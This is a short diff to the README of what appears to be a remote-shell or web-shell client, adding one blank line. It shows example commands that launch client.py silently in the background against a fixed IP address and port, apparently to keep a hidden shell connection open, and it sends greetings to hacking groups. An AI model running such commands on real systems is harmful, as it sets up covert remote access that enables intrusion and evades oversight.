@@ -55,6 +55,7 @@ If you’re trying to activate the Client threw ssl, shell or web shell then you
 
 ######Example:
 nohup python client.py 15.48.158.15 1567 > /dev/null &
+
 nohup python client.py 15.48.158.15 1567 > /dev/null 2>&1 &
 
 Greetings to Team Prophetic, Chaoshackerz and all the followers of https://dotcppfile.wordpress.com/,
